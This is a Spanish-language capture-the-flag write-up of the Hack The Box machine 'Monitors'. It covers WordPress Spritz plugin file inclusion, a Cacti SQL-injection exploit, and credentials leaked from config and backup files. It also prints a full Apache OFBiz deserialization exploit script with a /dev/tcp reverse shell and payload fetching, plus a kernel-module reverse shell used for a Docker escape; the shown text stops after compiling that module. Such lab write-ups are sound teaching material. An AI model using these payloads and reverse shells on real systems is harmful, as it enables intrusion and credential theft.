---
layout      : post
title       : "Maquina Monitors - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Monitors/monitors.jpeg
category    : [ hackthebox ]
tags        : [ Information Leaked, Wordpress Plugin Explotation, LFI, Cacti Explotation, Deserialization Attack, Docker Breakout, capability sysmodule ]
---

El dia de hoy vamos a estar resolviendo la maquina `Monitors` de `hackthebox` que es una maquina `Linux` de dificultad `Dificil`. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin `spritz` de `Wordpress` que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de `cacti` con una version vulnerable, seguidamente abusaremos de un ataque de `deserealizacion` con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability `sysmodule` para escapar del contenedor y ganar acceso a la maquina real como el usuario `root`.

Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Monitors
❯ ls
 Monitors
```

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
```

## Enumeración [#](#enumeración) {#enumeración}
 

Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.238
PING 10.10.10.238 (10.10.10.238) 56(84) bytes of data.
64 bytes from 10.10.10.238: icmp_seq=1 ttl=63 time=108 ms

--- 10.10.10.238 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.365/108.365/108.365/0.000 ms
```
Vemos que la maquina nos responde con un `ttl` de `63` correspondiente a una maquina `linux`, ahora procederemos a el scaneo de puertos con la ayuda de `nmap`:


### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `allPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.238 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:04 GMT
Initiating SYN Stealth Scan at 21:04
Scanning 10.10.10.238 [65535 ports]
Discovered open port 22/tcp on 10.10.10.238
Discovered open port 80/tcp on 10.10.10.238
Completed SYN Stealth Scan at 21:04, 28.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.238
Host is up, received user-set (2.6s latency).
Scanned at 2023-05-14 21:04:30 GMT for 29s
Not shown: 60433 closed tcp ports (reset), 5100 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.72 seconds
           Raw packets sent: 110162 (4.847MB) | Rcvd: 86054 (3.442MB)
```
Podemos ver puertos interesantes que se encuentran abiertos como `22 ssh` y `80 http`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p22,80 10.10.10.238 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:05 GMT
Nmap scan report for monitors.htb (10.10.10.238)
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to Monitor &#8211; Taking hardware monitoring seriously
|_http-generator: WordPress 5.5.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
```
Visulizamos la versión de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH      | OpenSSH 7.6p1  |
| 80   | HTTP     | Apache httpd 2.4.29  |



## Explotación [#](#explotación) {#explotación}

Primero ya que `nmap` no detecto el servicio del puerto `80` se encuentra abierto, trataremos de identificar las tecnologias que usa con la ayuda de `whatweb`.


```bash
❯ whatweb http://10.10.10.238
http://10.10.10.238 [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@monitors.htb], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238]
```

Podemos ver que se esta aplicando virtual hosting, asi que procederemos a agregar el dominio a nuestro `/etc/hosts`.


Volvemos a usar `whatweb`, pero esta vez aputando al dominio y esta vez la herramienta nos reporta el gestor de contenido que corresponde a un `wordpress`.

```bash
❯ whatweb http://monitors.htb
http://monitors.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], Title[Welcome to Monitor &#8211; Taking hardware monitoring seriously], UncommonHeaders[link], WordPress[5.5.1]
```

Procedemos a abrir la pagina en nuestro navegador.


![](/assets/images/HTB/htb-writeup-Monitors/moni1.PNG)


Vemos un articulo publicado por el usuario `admin`, y para validar que este es un usuario valido podemos intentar logearnos como este en la ruta `wp-login.php`.

![](/assets/images/HTB/htb-writeup-Monitors/moni2.PNG)


Ahora al tratarse de un `wordpress` trataremos de buscar plugins vulnerables asociados, para ello usaremos el diccionario `wp-plugins.fuzz.txt` del repositorio de `seclists`, enconjunto con nuestra herramienta de confianza `wfuzz`.

* [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

```bash
❯ wfuzz -c --hc=404 -t 100 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://monitors.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://monitors.htb/FUZZ
Total requests: 13368

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================


Total time: 36.76465
Processed Requests: 13368
Filtered Requests: 13368
Requests/sec.: 363.6101
```

`wfuzz` no logro descubrir un plugin valido, pero podemos tratar de acceder a la ruta de los `plugins` y ver si tenemos permiso para lista el directorio.


![](/assets/images/HTB/htb-writeup-Monitors/moni3.PNG)


Como podemos lista el contenido vemos el servicio usa `spritz` como plugin, asi que trataremos de buscar si existe una vulnerabilidad asociada a ello con `searchsploit`.


```bash
❯ searchsploit spritz
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                                                                                          | php/webapps/44544.php
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Efectivamente tal y como nos reporta existe una vulnerabilidad asociada `Remote File Inclusion`.


Analizando el codigo del `exploit` vemos que aprovecha una ruta para poder lista archivos de la maquina.

```bash
❯ cat 44544.php

1. Version Disclosure

/wp-content/plugins/wp-with-spritz/readme.txt

2. Source Code

if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);

3. Proof of Concept

/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
```

Probamos a listar el `/etc/hosts` de la maquina victima y nos lo muestra con exito.

```bash
❯ curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
```

Como sabemos que el servicio usa `apache`, podemos trata de listar el `000-default.conf` y tratar de filtrar información.

```bash
❯ curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-enabled/000-default.conf"
# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf
```

Vemos que existe otro `subdominio`, asi que procederemos a agregarlo tambien a nuestro `/etc/hosts`.

```bash
❯ echo "10.10.10.238 cacti-admin.monitors.htb" >> /etc/hosts
```

Ahora visiualizamos el servicio en el navegador.

![](/assets/images/HTB/htb-writeup-Monitors/moni4.PNG)


Vemos que usa `cacti` y con una version concreta correspondiente a la `1.2.12` y que tiene una vulnerabilidad asociada.

> Cacti es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas que poseen las aplicaciones RRDtool.

```bash
❯ searchsploit cacti 1.2.12
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cacti 1.2.12 - 'filter' SQL Injection                                                                                                                | php/webapps/49810.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Examinando el `exploit` vemos que deriva en una ejecución de comandos, y al ejecutarlo nos pide un `usuario y contraseña'`.


```bash
❯ python3 cacti.py
usage: cacti.py [-h] -t <target/host URL> -u <user> -p <password> --lhost <lhost> --lport <lport>
cacti.py: error: the following arguments are required: -t, -u, -p, --lhost, --lport
```

Debemos recordar que al enfrentarnos a un `wordpress`, podemos listar el `wp-config.php` y obtener unas credenciales validas, para ello podemos usar el `exploit spritz` y un wraper encoding de `base64`.

```bash
❯ curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=php://filter/convert.base64-encode/resource=../../../wp-config.php" | base64 -d
<?php
*
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
```


Obtemos unas credenciales que justamente son validas para el servicio `cacti`, asi que usaremos el `exploit` con los parametros necesarios y nos pondremos en escucha con `ncat` en el puerto `443`.

```bash
❯ python3 cacti.py -t http://cacti-admin.monitors.htb -u 'admin' -p 'BestAdministrator@2020!' --lhost 10.10.16.3 --lport 443
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:127e441cbfce235feca8a95a0ffa545f8f9f4f02,1684101076
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
"name","hex"
"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
"guest","43e9a4ab75570f5b"

[+] Check your nc listener!
```

Recibimos la conexion como `www-data` y estamos en la maquina victima.


```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:38574.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname -I
10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
```

Como es de costumbre vamos a conseguir una `tty` full interactiva.

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@monitors:/usr/share/cacti/cacti$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
www-data@monitors:/usr/share/cacti/cacti$ stty rows 45 columns 184
```

Nos dirigimos al directorio personal del usuario `marcus` y vemos que aun no podemos visualizar la `flag` como `www-data`.

```bash
www-data@monitors:/home$ cd marcus/
www-data@monitors:/home/marcus$ ls
note.txt  user.txt
www-data@monitors:/home/marcus$ cat user.txt 
cat: user.txt: Permission denied
```

Como tenemos un servicio `cacti` vamos a tratar de filtrar desde la raiz archivos que contengan la palabra `cacti` y encontramos una ruta con un archivo `cacti-backup-service`.

```bash
www-data@monitors:/home/marcus$ find / -name \*cacti\* 2>/dev/null
/etc/apache2/sites-available/cacti-admin.monitors.htb.conf
/etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
/etc/systemd/system/cacti-backup.service
/lib/systemd/system/cacti-backup.service
/var/log/cacti-access.log
/var/log/cacti-error.log
/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitor.htb
/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitors.htb
/usr/share/cacti
/usr/share/cacti/cacti
/usr/share/cacti/cacti/log/cacti.log
/usr/share/cacti/cacti/locales/po/cacti.pot
/usr/share/cacti/cacti/scripts/cacti_user_stats.php
/usr/share/cacti/cacti/include/cacti_version
```

Leemos el archivo y dentro nos muestra que dentro del directorio oculto `.backup` se encuentra un archivo `backup.sh`.


```bash
www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup.service 
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
```

Leemos el archivo `backup.sh` y encontramos unas credenciales.

```bash
www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```

Probamos la contraseña y podemos convertirnos en el usuario `marcus` y ahora si podemos visualizar la primera flag `user.txt`.

```bash
www-data@monitors:/home/marcus$ su marcus
Password: 
marcus@monitors:~$ whoami
marcus
marcus@monitors:~$ cat /home/marcus/user.txt 
055c999cf2967582c6bd59b2cd7fd44f
```

Enumerando el sistema al lista los puertos abiertos en la maquina, vemos un puerto curioso `8443`.

```bash
marcus@monitors:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      1 10.10.10.238:59308      1.1.1.1:53              SYN_SENT   
tcp        0    138 10.10.10.238:38574      10.10.16.3:443          ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       1      0 10.10.10.238:80         10.10.16.3:38872        CLOSE_WAIT
```

Para poder tener acceso a el desde nuestra maquina, nos conectaremos como el usuario `marcus` por el servicio `ssh`, que si recordamos estaba abierto y aplicaremos un `local port forwarding`.


```bash
❯ ssh marcus@10.10.10.238 -L 8443:127.0.0.1:8443
marcus@10.10.10.238's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 14 22:16:22 UTC 2023

  System load:  0.08               Users logged in:                0
  Usage of /:   34.9% of 17.59GB   IP address for ens160:          10.10.10.238
  Memory usage: 46%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
  Processes:    189

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

128 packages can be updated.
97 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 14 22:13:41 2023 from 10.10.16.3
marcus@monitors:~$ 
```
Verificamos que tenemos conexion al puerto.

```bash
❯ lsof -i:8443
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     66347 root    4u  IPv6 258489      0t0  TCP localhost:8443 (LISTEN)
ssh     66347 root    5u  IPv4 258490      0t0  TCP localhost:8443 (LISTEN)
```

Veamos el servicio desde nuestro navegador.

![](/assets/images/HTB/htb-writeup-Monitors/moni5.PNG)


Nos arroja el codigo de estado `404 not found`. Ahora trataremos con `wfuzz`.


```bash
❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://127.0.0.1:8443/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://127.0.0.1:8443/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000016:   302        0 L      0 W        0 Ch        "images"                                                                                                              
000000075:   302        0 L      0 W        0 Ch        "content"                                                                                                             
000000152:   302        0 L      0 W        0 Ch        "common"                                                                                                              
000000242:   302        0 L      0 W        0 Ch        "catalog"                                                                                                             
000000564:   302        0 L      0 W        0 Ch        "marketing"                                                                                                           
000000779:   302        0 L      0 W        0 Ch        "ecommerce"                                                                                                           
000000920:   302        0 L      0 W        0 Ch        "ap"                                                                                                                  
000001128:   302        0 L      0 W        0 Ch        "ar"                                                                                                                  
```

Vemos varias rutas que nos dan un codigo de estado `302 redirect`, y si provamos con la ruta `ecommerce`, en el navegador vemos algo relacionado a `ofbizsetup`.


![](/assets/images/HTB/htb-writeup-Monitors/moni6.PNG)


Como sabemos se esta usando el servicio de `apache` asi que podemos tratar de buscar vulnerabilidades asociadas a `apacheofbiz` y encontramos una de `RCE`.

```bash
❯ searchsploit apacheofbiz
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                                                | java/webapps/50178.sh
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```


Examinamos el `exploit` y vemos que aprovecha una vulnerabilidad de serealizacion.


```java
# Exploit Title: ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments
# Date: 2021-08-04
# Exploit Author: Álvaro Muñoz, Adrián Díaz (s4dbrd)
# Vendor Homepage: https://ofbiz.apache.org/index.html
# Software Link: https://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip
# Version: 17.12.01
# Tested on: Linux

# CVE : CVE-2020-9496

# Step 1: Host HTTP Service with python3 (sudo python3 -m http.server 80)
# Step 2: Start nc listener (Recommended 8001).
# Step 3: Run the exploit.


url='https://127.0.0.1' # CHANGE THIS
port=8443 # CHANGE THIS

function helpPanel(){
    echo -e "\nUsage:"
    echo -e "\t[-i] Attacker's IP"
    echo -e "\t[-p] Attacker's Port"
    echo -e "\t[-h] Show help pannel"
    exit 1
}


function ctrl_c(){
    echo -e "\n\n[!] Exiting...\n"
    exit 1
}
# Ctrl + C
trap ctrl_c INT

function webRequest(){
    echo -e "\n[*] Creating a shell file with bash\n"
    echo -e "#!/bin/bash\n/bin/bash -i >& /dev/tcp/$ip/$ncport 0>&1" > shell.sh
    echo -e "[*] Downloading YsoSerial JAR File\n"
    wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
    echo -e "[*] Generating a JAR payload\n"
    payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n")
    echo -e "[*] Sending malicious shell to server...\n" && sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
    echo -e "[*] Generating a second JAR payload"
    payload2=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n")
    echo -e "\n[*] Executing the payload in the server...\n" && sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload2</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
    echo -e "\n[*]Deleting Files..."
    rm ysoserial-master-d367e379d9-1.jar && rm shell.sh
}

declare -i parameter_enable=0; while getopts ":i:p:h:" arg; do
    case $arg in
        i) ip=$OPTARG; let parameter_enable+=1;;
        p) ncport=$OPTARG; let parameter_enable+=1;;
        h) helpPanel;;
    esac
done

if [ $parameter_enable -ne 2 ]; then
    helpPanel
else
    webRequest
fi
```

Ejecutamos el `exploit` nos pide como parametros nuestra ip de atacante y un puerto especifico.

```bash
❯ bash ofbiz.sh

Usage:
	[-i] Attacker's IP
	[-p] Attacker's Port
	[-h] Show help pannel
```

Nos compartimos un servicio web con `python3` ya que el `exploit` hara una petición a nuestra maquina solicitando un archivo de nombre `shell.sh` el cual previamente creara y con el cual nos devolvera una conexion al puerto que le especificamos. Seguidamente nos pondremos en escucha con `ncat` y lanzamos el `exploit`.

```bash
❯ bash ofbiz.sh -i 10.10.16.3 -p 443

[*] Creating a shell file with bash

[*] Downloading YsoSerial JAR File

[*] Generating a JAR payload

[*] Sending malicious shell to server...

[*] Generating a second JAR payload

[*] Executing the payload in the server...


[*]Deleting Files...
❯ cat ofbiz.sh
```

Recibimos la petición.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.238 - - [14/May/2023 22:43:38] "GET /shell.sh HTTP/1.1" 200 -
```

y ganamos acceso, pero a un contenedor.

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:40592.
bash: cannot set terminal process group (32): Inappropriate ioctl for device
bash: no job control in this shell
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# whoami
whoami
root
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# hostname -I
hostname -I
172.17.0.2 
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01#
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}


Haremos el mismo proceso anterior para obtener una `tty full interactive`. Lo siguiente que haremos sera descargarnos el `linpeas.sh` del repositorio de `carlospolop` y subirlo al contenedor para buscar formas potenciales de elevar nuestro privilegio.


```bash
root@b097fc57960e:/tmp# wget http://10.10.16.3/linpeas.sh
--2023-05-14 22:54:08--  http://10.10.16.3/linpeas.sh
Connecting to 10.10.16.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 835306 (816K) [text/x-sh]
Saving to: ‘linpeas.sh’
```


Le damos permiso al archivo y lo ejecutamos.

```bash
root@b097fc57960e:/tmp# chmod +x linpeas.sh 
root@b097fc57960e:/tmp# ./linpeas.sh
```

Despues de esperar a que nos haga un reconocimento, nos reporta algo potencial referente a una capability `sys_module` con la cual podemos convertirnos en `root` en la maquina real.

```bash
╔══════════╣ Container Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```

Si quieres saber mas al respecto puedes guiarte de este articulo.

*[https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd)


Lo primero que debemos hacer es crear un archivo `reverse-shell.c` con un contenido especifico, donde podemos cambiar la `ip y puerto` en el cual deseamos recibir la conexión, en este caso yo realizare la conexión en la interface `docker` del usuario `marcus` la cual corresponde a la `172.17.0.1` y en cuanto al puerto usare el que esta por defecto `4444`.


```bash
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.1/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Seguidamente crearemos un archivo `makefile` con otro contenido especifico.

```bash
obj-m +=reverse-shell.o
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Despues ejecutaremos un `make` para compilarlo, este nos creara un archivo `.ko`.

```bash
root@b097fc57960e:/tmp# make
make -C /lib/modules/4.15.0-151-generic/build M=/tmp modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-151-generic'
  CC [M]  /tmp/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/reverse-shell.mod.o
  LD [M]  /tmp/reverse-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-151-generic'
root@b097fc57960e:/tmp# ls
